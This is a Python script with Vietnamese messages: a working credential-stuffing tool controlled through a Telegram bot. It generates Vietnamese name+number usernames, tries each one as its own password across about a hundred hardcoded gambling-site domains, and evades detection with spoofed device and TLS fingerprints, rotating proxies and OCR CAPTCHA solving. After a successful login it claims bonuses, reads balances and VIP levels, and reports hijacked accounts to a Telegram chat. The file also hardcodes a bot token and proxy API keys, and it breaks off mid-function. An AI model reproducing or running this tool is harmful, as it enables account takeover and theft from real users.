import os
os.environ["OMP_NUM_THREADS"] = "1"
os.environ["MKL_NUM_THREADS"] = "1"
os.environ["OPENBLAS_NUM_THREADS"] = "1"
os.environ["VECLIB_MAXIMUM_THREADS"] = "1"
os.environ["NUMEXPR_NUM_THREADS"] = "1"
import sys
import time
import uuid
import base64
import random
import hashlib
import secrets
import threading
import json
import re
from queue import Queue, Empty
from typing import Optional, Dict, Any, List, Tuple
import requests

# ── Dependencies ──────────────────────────────────────────
try:
    from curl_cffi import requests as cffi_requests
    import ddddocr
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    import PIL.Image
    if not hasattr(PIL.Image, "ANTIALIAS"):
        PIL.Image.ANTIALIAS = PIL.Image.LANCZOS
    import numpy as np
    import cv2
    from aiogram import Bot, Dispatcher, types
    from aiogram.filters import Command
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
except ImportError as e:
    print(f"❌ Thiếu thư viện: {e}. Vui lòng chạy: pip install curl_cffi ddddocr pycryptodome pillow numpy opencv-python requests aiogram")
    sys.exit(1)

# ============ CONFIG & DOMAINS FILE ============
DOMAINS_FILE = "domains.json"
INVALID_DOMAINS_FILE = "invalid_domains.json"

DEFAULT_DOMAINS = [
    "m.111pg99.com",
    "m.164789.com",
    "m.16vvvwin.com",
    "m.18win.com",
    "m.190789.com",
    "m.1bmw.com",
    "m.1bmw.me",
    "m.1bmw.tv",
    "m.1pg66.com",
    "m.2026pg66.com",
    "m.202789.com",
    "m.23win.baby",
    "m.23win08.com",
    "m.23win09.com",
    "m.26hello88.com",
    "m.2888.com",
    "m.2pg66.com",
    "m.32win75.com",
    "m.32win76.com",
    "m.32win77.com",
    "m.333pg99.com",
    "m.336049.com",
    "m.43nmvd.com",
    "m.4vipwin.com",
    "m.5ivug.fun",
    "m.5vipwin.com",
    "m.69vn5.com",
    "m.69vn6.com",
    "m.69vn7.com",
    "m.69vn8.com",
    "m.789bettg.net",
    "m.789win0052.com",
    "m.79k09.club",
    "m.79king1.com",
    "m.82king88.com",
    "m.88ck.xyz",
    "m.88ok7.net",
    "m.88vv.my",
    "m.89bet3000.com",
    "m.8k0341q.top",
    "m.8k4028q.top",
    "m.8k438sj.top",
    "m.98wn65.com",
    "m.abc11.ink",
    "m.abc81.store",
    "m.by6yg1.com",
    "m.dpyg3.xyz",
    "m.f8897.vip",
    "m.f8beaa.top",
    "m.f8bet6.chat",
    "m.ffok04.com",
    "m.ffok05.com",
    "m.ffok06.com",
    "m.ffok07.com",
    "m.gjjdhh-235dhdhkk.vip",
    "m.good8812.cc",
    "m.good8813.cc",
    "m.good8814.cc",
    "m.good8815.cc",
    "m.hello66.com",
    "m.hi88208.com",
    "m.hi88278.com",
    "m.hi88298.com",
    "m.hi88xx.com",
    "m.hkt699e.vip",
    "m.hubet59.com",
    "m.j866.ink",
    "m.kardupo.cc",
    "m.kl99.fan",
    "m.kl991.com",
    "m.kuwn42.com",
    "m.kuwn57.com",
    "m.kuwn58.com",
    "m.lomzeti.cc",
    "m.mb6614.run",
    "m.mb66a3.com",
    "m.mmrkb1.com",
    "m.new888e.vip",
    "m.new88pc.com",
    "m.newwa.vip",
    "m.nh113.vip",
    "m.nh114.vip",
    "m.nh225.vip",
    "m.ok36533.vip",
    "m.ok36555.vip",
    "m.ok36556.vip",
    "m.ok36557.vip",
    "m.ok559.cc",
    "m.okking72.com",
    "m.okking91.com",
    "m.okvnd.my",
    "m.pg99066.icu",
    "m.pg99go.com",
    "m.shbe60.net",
    "m.u821.store",
    "m.u888w.click",
    "m.vip32win.club",
    "m.vipwin18.com",
    "m.vipwin19.com",
    "m.vipwin20.com",
    "m.vvvwin04.vip",
    "m.vvvwin05.vip",
    "m.win55mm.com",
    "m.win55mmm.com",
    "m.xin88.xin"
]

domain_lock = threading.Lock()
invalid_lock = threading.Lock()
cache_lock = threading.Lock()

def load_domains() -> List[str]:
    with domain_lock:
        if os.path.exists(DOMAINS_FILE):
            try:
                with open(DOMAINS_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, list) and data:
                        return data
            except Exception:
                pass
    save_domains(DEFAULT_DOMAINS)
    return DEFAULT_DOMAINS

def save_domains(domains: List[str]):
    with domain_lock:
        try:
            with open(DOMAINS_FILE, "w", encoding="utf-8") as f:
                json.dump(domains, f, ensure_ascii=False, indent=4)
        except Exception:
            pass

selected_scan_domains = []

NEST_API_KEY = "63ed0cc2-6d3d-4638-ae19-e1055a00f4e9"
NEST_PROXY_KEY = "UK-b3014e75-d8a1-43d1-88de-36347bd5d954"
NUM_THREADS = 50
PROGRESS_EVERY = 200

DEFAULT_TG_TOKEN = '8945935067:AAE2VDijVUdIM-DYUlmKff2uvWgZBdpgjjI'
DEFAULT_TG_CHAT_ID = '7348217229'

is_scanning = False

HO_DEM_KHONG_DAU = [
    "nguyen", "tran", "le", "pham", "hoang", "huynh", "phan", "vu", "vinh", "vo",
    "dang", "bui", "do", "ho", "ngo", "duong", "ly", "an", "bao", "binh",
    "chinh", "cong", "cuong", "dung", "duy", "dai", "dat", "duc", "duong", "giang",
    "hai", "hao", "hieu", "hoa", "hoang", "huy", "hung", "huong", "kha", "khanh",
    "khoa", "kiet", "lam", "linh", "long", "luong", "minh", "nam", "nghia", "nhan",
    "nhat", "phat", "phong", "phuc", "phuong", "quan", "quang", "quynh", "sang", "son",
    "tai", "tam", "tan", "thanh", "thao", "thien", "thinh", "thu", "thuan", "thuong",
    "tien", "toan", "trang", "tri", "triet", "trung", "truong", "tuan", "tung", "uyen",
    "van", "viet", "vinh", "vu", "vy", "bien", "cam", "chau", "chi", "diep", "duyen",
    "hien", "hong", "hue", "lan", "mai", "my", "nga", "ngoc", "nhung"
]

HO_VA_TEN = [
    "anh", "bao", "binh", "chinh", "cong", "cuong", "dung", "duy", "dai", "dat",
    "duc", "dung", "duong", "giang", "hai", "hao", "hieu", "hoa", "hoang", "huy",
    "hung", "huong", "kha", "khanh", "khoa", "kiet", "lam", "linh", "long", "luong",
    "minh", "nam", "nghia", "nhan", "nhat", "phat", "phong", "phuc", "phuong", "quan",
    "quang", "quynh", "sang", "son", "tai", "tam", "tan", "thanh", "thao", "thien",
    "thinh", "thu", "thuan", "thuong", "tien", "toan", "trang", "tri", "triet", "trung",
    "truong", "tuan", "tung", "uyen", "van", "viet", "vinh", "vu", "vinh", "vy",
    "an", "bien", "cam", "chau", "chi", "diep", "dung", "duyen", "giang", "hien",
    "hoa", "hong", "hue", "huong", "khanh", "lan", "linh", "mai", "my", "nga",
    "ngoc", "nhung", "phuong", "quynh", "tam", "thao", "thu", "thuy", "trang", "uyen"
]

class FormStates(StatesGroup):
    waiting_for_range = State()
    waiting_for_confirmation = State()
    waiting_for_new_domain = State()

def generate_txt_file(num_unique_names: int, start_num: int, end_num: int, single_name_mode: bool, selected_names: List[str] = None) -> List[str]:
    lines = []
    try:
        if single_name_mode:
            base_name = selected_names[0] if selected_names else f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}"
            for i in range(start_num, end_num + 1):
                lines.append(f"{base_name}{i}")
        else:
            names_pool = selected_names if selected_names else [f"{random.choice(HO_DEM_KHONG_DAU)}{random.choice(HO_VA_TEN)}" for _ in range(num_unique_names)]
            for name in names_pool:
                for i in range(start_num, end_num + 1):
                    lines.append(f"{name}{i}")

        with open("100.txt", "w", encoding="utf-8") as f:
            for line in lines:
                f.write(f"{line}\n")
        return lines
    except Exception as e:
        print(f"Lỗi tạo file: {e}")
        return []

CACHE_FILE = "endpoint_cache.json"
DEFAULT_ENDPOINT_CACHE = {}

def load_endpoint_cache() -> dict:
    with cache_lock:
        cache = DEFAULT_ENDPOINT_CACHE.copy()
        if os.path.exists(CACHE_FILE):
            try:
                with open(CACHE_FILE, "r", encoding="utf-8") as f:
                    disk_cache = json.load(f)
                    cache.update(disk_cache)
            except Exception:
                pass
        return cache

def save_endpoint_cache(cache: dict):
    with cache_lock:
        try:
            with open(CACHE_FILE, "w", encoding="utf-8") as f:
                json.dump(cache, f, ensure_ascii=False, indent=4)
        except Exception:
            pass

class OCRPool:
    def __init__(self, size=32):
        self._pool = []
        self._size = size
        self._idx = 0
        self._lock = threading.Lock()
    def get(self):
        with self._lock:
            if len(self._pool) < self._size:
                self._pool.append(ddddocr.DdddOcr(show_ad=False))
            o = self._pool[self._idx]
            self._idx = (self._idx + 1) % len(self._pool)
            return o

ocr_pool = OCRPool(128)

def load_accounts() -> list:
    users = []
    if not os.path.exists("100.txt"):
        generate_txt_file(num_unique_names=5, start_num=1, end_num=200, single_name_mode=False)
    try:
        with open("100.txt", "r", encoding="utf-8", errors="ignore") as f:
            seen = set()
            for line in f:
                line = line.strip()
                if not line: continue
                parts = line.split("|") if "|" in line else line.split(":")
                u = parts[0].strip() if len(parts) >= 2 else line.strip()
                if u and u not in seen:
                    seen.add(u)
                    users.append({"user": u, "pw": u})
    except Exception as e:
        print(f"⚠️ Lỗi đọc file tài khoản: {e}")
    return users

print_lock = threading.Lock()
class Col:
    GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"
    CYAN = "\033[96m"; GOLD = "\033[33;1m"; RESET = "\033[0m"

def log_safe(msg, color=Col.RESET):
    with print_lock:
        print(f"{color}{msg}{Col.RESET}")

def send_telegram(site: str, user: str, balance: str, vip: str, lixi: str, is_big_win: bool, is_high_vip: bool):
    if is_big_win or is_high_vip:
        text = (
            f"🚨 🔥 <b>[HÀNG KHỦNG]</b> 🔥 🚨\n"
            f"🪐 <b>Web:</b> <code>https://{site}</code>\n"
            f"👤 <b>User:</b> <code>{user}</code>\n"
            f"💰 <b>Bal:</b> <b><u>{balance}</u></b> 💥\n"
            f"🎖️ <b>VIP:</b> <b>⭐ {vip} ⭐</b>\n"
            f"🧧 <b>Lì xì:</b> <code>{lixi}</code>"
        )
    else:
        text = (
            f"✨ <b>SAO PHAI XOAN</b> ✨\n"
            f"🪐 <b>Web:</b> <code>https://{site}</code>\n"
            f"👤 <b>User:</b> <code>{user}</code>\n"
            f"💰 <b>Bal:</b> <code>{balance}</code> | 🎖️ <b>VIP:</b> <code>{vip}</code>"
        )
        
    url_send = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/sendMessage"
    payload = {"chat_id": DEFAULT_TG_CHAT_ID, "text": text, "parse_mode": "HTML"}
    
    while True:
        try:
            resp = requests.post(url_send, json=payload, timeout=15)
            res_data = resp.json()
            if res_data.get("ok"):
                if is_big_win or is_high_vip:
                    message_id = res_data["result"]["message_id"]
                    url_pin = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/pinChatMessage"
                    try:
                        requests.post(url_pin, json={"chat_id": DEFAULT_TG_CHAT_ID, "message_id": message_id}, timeout=10)
                    except Exception:
                        pass
                break
        except Exception:
            pass
        time.sleep(3)

class AntiDetect:
    _DEVICES = [
        ("Samsung", "SM-S931B", "15", (412, 915), "Samsung Xclipse 940", "124.0.6367.82"),
        ("Google", "Pixel 8 Pro", "14", (412, 915), "ARM Mali-G715", "124.0.6367.82"),
        ("Xiaomi", "23117RK6BC", "14", (393, 851), "Qualcomm Adreno (TM) 750", "124.0.6367.82"),
    ]

    @classmethod
    def generate(cls) -> Dict[str, Any]:
        brand, model, android_ver, screen, gpu, chrome_ver = random.choice(cls._DEVICES)
        major_ver = chrome_ver.split(".")[0]
        ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
        return {
            "ua": ua, 
            "sec_ch_ua": f'"Not/A)Brand";v="99", "Chromium";v="{major_ver}", "Google Chrome";v="{major_ver}"',
            "sec-ch-ua-full-version-list": f'"Chromium";v="{chrome_ver}", "Google Chrome";v="{chrome_ver}"',
            "sec-ch-ua-platform-version": f'"{android_ver}.0.0"',
            "sec-ch-ua-model": f'"{model}"',
            "device_fp": hashlib.md5(secrets.token_hex(16).encode()).hexdigest(),
            "tls_profile": "chrome120"
        }

PUB_KEY = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCKcWX+rK229Li2zXDtB5KJOESv
RrCTNiUIwZ/Iljkfm9lSnt22N8Iqzv/h8O1+xTMqlORSJM1Xq3tRtRIUNMJMTEv8
oqUOJesJFPE+V0agCQ5COhKrUkTqjJ71izDUGJokeCIL4zSV1y7ZJI1PKcP+BH5o
NM6BVGhApPFQeDrI/QIDAQAB
-----END PUBLIC KEY-----"""

def make_sec_headers(domain: str, ua: str) -> Dict[str, str]:
    ts = str(int(time.time() * 1000))
    nonce = str(uuid.uuid4())
    data = f"{ts}:{nonce}:{domain}:{ua}".encode("utf-8")
    key = RSA.import_key(PUB_KEY)
    ciph = PKCS1_v1_5.new(key)
    enc = b"".join(ciph.encrypt(data[i:i+117]) for i in range(0, len(data), 117))
    return {"x-nonce": nonce, "x-timestamp": ts, "x-sec-data": base64.b64encode(enc).decode()}

def solve_captcha(img_b64: str) -> Optional[str]:
    try:
        if "," in img_b64: img_b64 = img_b64.split(",")[1]
        img_bytes = base64.b64decode(img_b64)
        img_np = cv2.imdecode(np.frombuffer(img_bytes, dtype=np.uint8), cv2.IMREAD_GRAYSCALE)
        if img_np is None: return None
        
        img_np = cv2.resize(img_np, (0, 0), fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
        _, img_np = cv2.threshold(img_np, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, clean = cv2.imencode(".png", img_np)
        
        ocr = ocr_pool.get()
        res = ocr.classification(clean.tobytes(), png_fix=True)
        if not res: res = ocr.classification(img_bytes)
        if not res: return None
        
        res = res.strip().upper().replace(" ", "")
        res = res.replace("O", "0").replace("L", "1").replace("I", "1").replace("S", "5").replace("B", "8")
        cleaned_res = re.sub(r'[^A-Z0-9]', '', res)
        
        if 3 <= len(cleaned_res) <= 6:
            return cleaned_res
        return None
    except Exception:
        return None

class SiteAPI:
    def __init__(self, domain: str, proxy: Optional[str] = None):
        self.domain = domain
        self.profile = AntiDetect.generate()
        self.ua = self.profile["ua"]
        self.fp = self.profile["device_fp"]
        self.auth_token = None
        self.session = cffi_requests.Session(impersonate=self.profile["tls_profile"])
        if proxy:
            p = proxy if "://" in proxy else f"http://{proxy}"
            self.session.proxies = {"http": p, "https": p}
        self.session.headers.update({
            "user-agent": self.ua, 
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*", 
            "sec-ch-ua": self.profile["sec_ch_ua"],
            "sec-ch-ua-full-version-list": self.profile["sec-ch-ua-full-version-list"],
            "sec-ch-ua-platform-version": self.profile["sec-ch-ua-platform-version"],
            "sec-ch-ua-model": self.profile["sec-ch-ua-model"],
            "sec-ch-ua-mobile": "?1", 
            "sec-ch-ua-platform": '"Android"', 
            "x-requested-with": "XMLHttpRequest",
            "referer": f"https://{domain}/", 
            "origin": f"https://{domain}", 
            "content-language": "vi-VN"
        })
        
        self._warmup_home_page()

        endpoints = self.auto_discover_endpoints()
        if not endpoints:
            raise ValueError(f"Domain {domain} không phản hồi endpoint chuẩn hoặc bị chặn bảo mật.")
        
        self.login_endpoint, self.captcha_endpoint, self.setting_endpoint = endpoints

    def _warmup_home_page(self):
        try:
            self.session.get(f"https://{self.domain}/", timeout=8.0)
        except Exception:
            pass

    def auto_discover_endpoints(self) -> Optional[Tuple[str, str, str]]:
        cache = load_endpoint_cache()
        cached = cache.get(self.domain)
        if cached and isinstance(cached, dict):
            login = cached.get("login")
            captcha = cached.get("captcha")
            setting = cached.get("setting")
            if login and captcha and setting:
                return login, captcha, setting

        candidate_settings = ["/portalApi/1.0/user/loginSetting", "/api/1.0/user/loginSetting"]
        candidate_captchas = ["/portalApi/1.0/login/captcha", "/api/1.0/login/captcha"]
        candidate_logins = ["/portalApi/1.0/login/submit", "/api/0.0/login/login", "/api/1.0/login/submit"]

        found_setting = None
        found_captcha = None
        found_login = None

        for ep in candidate_settings:
            try:
                r = self.session.get(f"https://{self.domain}{ep}", timeout=6.0)
                if r.status_code in [200, 400, 405, 422]:
                    found_setting = ep
                    break
            except Exception:
                pass

        for ep in candidate_captchas:
            try:
                r = self.session.get(f"https://{self.domain}{ep}", timeout=6.0)
                if r.status_code in [200, 400, 405, 422]:
                    found_captcha = ep
                    break
            except Exception:
                pass

        for ep in candidate_logins:
            try:
                r = self.session.post(f"https://{self.domain}{ep}", json={}, timeout=6.0)
                if r.status_code not in [404, 502, 503, 504]:
                    found_login = ep
                    break
            except Exception:
                pass

        if not found_login: found_login = "/portalApi/1.0/login/submit"
        if not found_captcha: found_captcha = "/portalApi/1.0/login/captcha"
        if not found_setting: found_setting = "/portalApi/1.0/user/loginSetting"

        new_cache = load_endpoint_cache()
        new_cache[self.domain] = {
            "setting": found_setting,
            "captcha": found_captcha,
            "login": found_login
        }
        save_endpoint_cache(new_cache)

        return found_setting, found_captcha, found_login

    def _sec(self) -> Dict[str, str]:
        headers = make_sec_headers(self.domain, self.ua)
        headers.update({
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8"
        })
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
            headers["token"] = str(self.auth_token)
        return headers

    def get_captcha_login(self) -> Optional[Dict[str, Any]]:
        needs_captcha = True
        try:
            r_set = self.session.get(f"https://{self.domain}{self.setting_endpoint}", timeout=6.0)
            if r_set.status_code == 200:
                res_set = r_set.json()
                data_set = res_set.get("ReturnObject") or res_set.get("Data") or res_set.get("result") or res_set
                if isinstance(data_set, dict):
                    if data_set.get("IsShowCaptcha") is False or data_set.get("needCode") is False or data_set.get("showCaptcha") is False:
                        needs_captcha = False
        except Exception:
            pass

        if not needs_captcha:
            return {"image": None, "value": "", "no_captcha": True}

        url = f"https://{self.domain}{self.captcha_endpoint}"
        for _ in range(2):
            try:
                r = self.session.get(url, timeout=6.0)
                if r.status_code == 200:
                    res = r.json()
                    result_obj = res.get("Result") or res.get("Data") or res.get("ReturnObject") or res.get("data") or res
                    if isinstance(result_obj, dict):
                        img = result_obj.get("Image") or result_obj.get("image") or result_obj.get("img") or result_obj.get("base64")
                        val = result_obj.get("EncryptValue") or result_obj.get("Value") or result_obj.get("value") or result_obj.get("key")
                        if img and len(str(img)) > 20:
                            return {"image": img, "value": val or "", "no_captcha": False}
                time.sleep(0.3)
            except Exception:
                time.sleep(0.3)
        return {"image": None, "value": "", "no_captcha": False, "error": "CAPTCHA_NOT_READY"}

    def login(self, user: str, pw: str, code: str = "", enc_val: str = "") -> str:
        body = {
            "account": user, 
            "password": pw, 
            "checkCode": code, 
            "checkCodeEncrypt": enc_val, 
            "fingerprint": self.fp, 
            "usedApp": False
        }
        
        max_retries = 2
        for attempt in range(max_retries):
            try:
                r = self.session.post(f"https://{self.domain}{self.login_endpoint}", json=body, headers=self._sec(), timeout=15)
                if r.status_code == 200:
                    res = r.json()
                    code_val = res.get("Code") or res.get("code")
                    if code_val == 200 or code_val == 0 or res.get("IsSuccess") is True:
                        login_token = res.get("LoginToken") or res.get("Data") or res.get("result") or res.get("data")
                        if isinstance(login_token, dict):
                            self.auth_token = login_token.get("AccessToken") or login_token.get("token") or login_token.get("accessToken")
                        elif isinstance(login_token, str):
                            self.auth_token = login_token
                        return "SUCCESS"
                    
                    msg = str(res.get("Message") or res.get("ErrorMessage") or res.get("msg") or "").lower()
                    if any(k in msg for k in ["sai", "không đúng", "mật khẩu", "tài khoản", "tồn tại", "đăng nhập"]):
                        return "WRONG_PASS"
                    return "WRONG_PASS" 
                elif r.status_code in [400, 422, 401]:
                    return "WRONG_PASS"
                elif r.status_code == 403:
                    return "FAIL"
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(0.5)
                    continue
                log_safe(f"[LOGIN EXCEPTION] {self.domain} | {user} -> {e}", Col.RED)
                
        return "FAIL"

    def get_balance(self) -> Tuple[str, str]:
        endpoints = ["/api/0.0/Home/get-balance/?app=1", "/api/1.0/user/info?app=1"]
        for ep in endpoints:
            try:
                r = self.session.get(f"https://{self.domain}{ep}", headers=self._sec(), timeout=6)
                if r.status_code == 200:
                    res = r.json()
                    data = res.get("ReturnObject") or res.get("Data") or res.get("Result") or res.get("data") or res
                    if isinstance(data, list): data = data[0] if data else {}
                    if isinstance(data, dict):
                        balance = data.get("Money") or data.get("money") or data.get("Balance") or data.get("balance")
                        if balance is not None:
                            return str(balance), "0"
            except Exception:
                pass
        return "0", "0"

    def get_vip_info(self) -> str:
        endpoints = ["/api/1.0/member/vip/experience?app=1", "/api/1.0/user/vip-info"]
        for ep in endpoints:
            try:
                r = self.session.get(f"https://{self.domain}{ep}", headers=self._sec(), timeout=6)
                if r.status_code == 200:
                    res = r.json()
                    data_obj = res.get("ReturnObject") or res.get("Data") or res.get("Result") or res.get("data") or res
                    if isinstance(data_obj, list) and len(data_obj) > 0: data_obj = data_obj[0]
                    if isinstance(data_obj, dict):
                        for key in ["Grade", "grade", "VipLevel", "vipLevel", "level"]:
                            if key in data_obj and data_obj[key] is not None:
                                return str(data_obj[key])
            except Exception:
                pass
        return "0"

    def check_and_claim_lixi(self) -> List[Dict[str, Any]]:
        claimed = []
        try:
            r = self.session.post(f"https://{self.domain}/api/0.0/RedEnvelope/GetRedEnvelopListNew", json={}, headers=self._sec(), timeout=6)
            res = r.json()
            data = res.get("ReturnObject") or res.get("Data") or res.get("Result") or []
            if isinstance(data, list):
                for item in data:
                    if not isinstance(item, dict): continue
                    env_id = item.get("id") or item.get("Id") or item.get("envelopeId")
                    if env_id:
                        try:
                            r_claim = self.session.post(f"https://{self.domain}/api/1.0/redEnvelope/received", json={"id": int(env_id)}, headers=self._sec(), timeout=6)
                            res_claim = r_claim.json()
                            msg = res_claim.get("Message") or res_claim.get("ErrorMessage") or "Thành công"
                            claimed.append({"id": env_id, "ok": True, "msg": msg})
                        except Exception:
                            pass
        except Exception:
            pass
        return claimed

class ProxyProvider:
    def __init__(self, rotate_interval=300):
        self.proxy = None
        self.lock = threading.Lock()
        self.last_update = 0
        self.cache_time = rotate_interval

    def get_new_proxy(self):
        headers = {"user-api-key": NEST_API_KEY}
        try:
            requests.post("https://nestproxy.com/api/client/proxy/remove", params={"proxy_key": NEST_PROXY_KEY}, headers=headers, timeout=10)
            time.sleep(1.5)
            r = requests.get("https://nestproxy.com/api/client/proxy/available", params={"proxy_key": NEST_PROXY_KEY}, headers=headers, timeout=10)
            data = r.json()
            proxy = data.get("proxy")
            if proxy:
                return proxy if proxy.startswith("http") else "http://" + proxy
        except Exception:
            pass
        return None

    def get_proxy(self, force_refresh=False):
        with self.lock:
            now = time.time()
            if force_refresh or self.proxy is None or (now - self.last_update >= self.cache_time):
                p = self.get_new_proxy()
                if p:
                    self.proxy = p
                    self.last_update = now
            return self.proxy

def parse_balance(bal_str: str) -> float:
    try: return float(str(bal_str).replace(',', '').strip())
    except: return 0.0

def run_scanner_task(chat_id: int):
    global is_scanning, selected_scan_domains
    is_scanning = True
    accounts = load_accounts()
    
    all_domains = load_domains()
    domains_to_scan = selected_scan_domains if selected_scan_domains else all_domains
        
    if not domains_to_scan:
        log_safe("⚠️ Chưa chọn domain nào để quét!", Col.RED)
        return

    total_tasks = len(accounts) * len(domains_to_scan)
    log_safe(f"🚀 Bắt đầu quét với tổng số {len(accounts)} tài khoản và {len(domains_to_scan)} tên miền (Tổng: {total_tasks:,})...", Col.GOLD)
    
    task_queue = Queue()
    for a in accounts:
        for domain in domains_to_scan:
            task_queue.put((a, domain))

    completed_count = 0
    success_count = 0
    wrong_pass_count = 0
    other_fail_count = 0
    
    count_lock = threading.Lock()
    proxy_provider = ProxyProvider(rotate_interval=60)

    def worker():
        nonlocal completed_count, success_count, wrong_pass_count, other_fail_count
        while is_scanning:
            try:
                acc, domain = task_queue.get(timeout=1)
            except Empty:
                if task_queue.empty():
                    break
                continue
            except Exception:
                break

            max_retries = 2
            res = "FAIL"
            success_flag = False

            for attempt in range(max_retries):
                try:
                    proxy = proxy_provider.get_proxy(force_refresh=(attempt > 0))
                    try:
                        api = SiteAPI(domain, proxy)
                    except ValueError as ve:
                        break
                    
                    time.sleep(random.uniform(0.1, 0.2))
                    cap_data = api.get_captcha_login()
                    
                    if not cap_data or cap_data.get("error") == "CAPTCHA_NOT_READY":
                        res = "FAIL"
                        break
                    elif cap_data.get("no_captcha") is True:
                        res = api.login(acc['user'], acc['pw'])
                    else:
                        code = solve_captcha(cap_data.get('image', ''))
                        if code:
                            time.sleep(0.1)
                            res = api.login(acc['user'], acc['pw'], code, cap_data.get('value', ''))
                        else:
                            res = "FAIL"
                    break 
                except Exception as e:
                    if attempt < max_retries - 1:
                        time.sleep(0.5)
                        continue
                    else:
                        res = "FAIL"
                    
                    success_flag = True
                    break 
                except Exception as e:
                    if attempt < max_retries - 1:
                        time.sleep(0.5)
                        continue
                    else:
                        log_safe(f"[REQUEST TIMEOUT/ERROR] {domain} | {acc['user']} -> {e}", Col.RED)
                        res = "FAIL"

            with count_lock:
                completed_count += 1
                if res == "SUCCESS": success_count += 1
                elif res == "WRONG_PASS": wrong_pass_count += 1
                else: other_fail_count += 1
                    
                curr_completed = completed_count
                curr_success = success_count
                curr_wrong = wrong_pass_count
                curr_other = other_fail_count

            if res == "SUCCESS":
                try:
                    claimed_lixi = api.check_and_claim_lixi()
                    balance, _ = api.get_balance()
                    vip = api.get_vip_info()
                    bal_num = parse_balance(balance)
                    is_big_win = bal_num > 10
                    try: vip_num = int(vip)
                    except: vip_num = 0
                    is_high_vip = vip_num >= 5

                    lixi_tg_str = ", ".join([f"ID {l['id']}: {l['msg']}" for l in claimed_lixi]) if claimed_lixi else "Không có"
                    log_safe(f"[SUCCESS] {domain} | {acc['user']} | Bal: {balance} | VIP: {vip}", Col.GREEN)
                    send_telegram(domain, acc['user'], balance, f"VIP {vip}", lixi_tg_str, is_big_win, is_high_vip)
                except Exception:
                    pass

            if curr_completed % PROGRESS_EVERY == 0 or curr_completed == total_tasks:
                log_safe(f"[TIẾN ĐỘ] Hoàn thành: {curr_completed:,}/{total_tasks:,} | Thành công: {curr_success} | Sai MK: {curr_wrong:,} | Lỗi khác: {curr_other:,}", Col.CYAN)

            task_queue.task_done()

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(NUM_THREADS)]
    for t in threads: t.start()
    for t in threads: t.join()

    is_scanning = False
    log_safe("✅ Đã quét xong toàn bộ danh sách!", Col.GREEN)
    try:
        url_send = f"https://api.telegram.org/bot{DEFAULT_TG_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": "✅ Quá trình quét hoàn tất!", "parse_mode": "HTML"}
        requests.post(url_send, json=payload, timeout=10)
    except Exception:
        pass

# ============ TELEGRAM BOT HANDLERS ============
telegram_bot = Bot(token=DEFAULT_TG_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="⚙️ Tạo danh sách tên ngẫu nhiên mới", callback_data="config_gen")
    builder.button(text="🌐 Chọn Domain quét", callback_data="config_domains")
    builder.button(text="➕ Thêm Domain mới", callback_data="add_domain_prompt")
    builder.button(text="🚀 Bắt đầu quét", callback_data="start_scan")
    builder.button(text="⏹ Dừng lại", callback_data="stop_scan")
    builder.adjust(1)
    
    await message.answer(
        "🤖 **BẢNG ĐIỀU KHIỂN TOOL QUÉT TÀI KHOẢN**\n\n"
        "Chọn chức năng bên dưới:",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data == "config_domains")
async def cb_config_domains(callback: types.CallbackQuery):
    await callback.answer()
    domains = load_domains()
    global selected_scan_domains
    
    if not selected_scan_domains:
        selected_scan_domains = list(domains)

    builder = InlineKeyboardBuilder()
    for idx, domain in enumerate(domains):
        is_checked = domain in selected_scan_domains
        icon = "✓" if is_checked else "·"
        short_name = domain.replace("m.", "")
        builder.button(text=f"{icon} {short_name}", callback_data=f"toggle_domain_{idx}")
    
    row_config = [3] * (len(domains) // 3)
    if len(domains) % 3 > 0:
        row_config.append(len(domains) % 3)
        
    builder.adjust(*row_config)
    
    builder.row(
        types.InlineKeyboardButton(text="☑️ Chọn tất cả", callback_data="domain_select_all"),
        types.InlineKeyboardButton(text="❌ Bỏ chọn hết", callback_data="domain_unselect_all")
    )
    builder.row(
        types.InlineKeyboardButton(text="➕ Thêm Domain", callback_data="add_domain_prompt"),
        types.InlineKeyboardButton(text="💾 Lưu & Thoát", callback_data="back_home")
    )

    await callback.message.edit_text(
        f"🌐 **QUẢN LÝ & CHỌN DOMAIN QUÉT**\n\n"
        f"• Tổng số: **{len(domains)}** | Đang chọn: **{len(selected_scan_domains)}**\n"
        f"*(Chạm vào domain để bật/tắt)*",
        reply_markup=builder.as_markup(),
        parse_mode="Markdown"
    )

@dp.callback_query(lambda c: c.data.startswith("toggle_domain_"))
async def cb_toggle_domain(callback: types.CallbackQuery):
    await callback.answer()
    idx = int(callback.data.split("_")[2])
    domains = load_domains()
    global selected_scan_domains
    
    if not selected_scan_domains:
        selected_scan_domains = list(domains)
        
    if idx < len(domains):
        domain = domains[idx]
        if domain in selected_scan_domains:
            selected_scan_domains.remove(domain)
        else:
            selected_scan_domains.append(domain)

    builder = InlineKeyboardBuilder()
    for i, d in enumerate(domains):
        is_checked = d in selected_scan_domains
        icon = "✓" if is_checked else "·"
        short_name = d.replace("m.", "")
        builder.button(text=f"{icon} {short_name}", callback_data=f"toggle_domain_{i}")
    
    row_config = [3] * (len(domains) // 3)
    if len(domains) % 3 > 0:
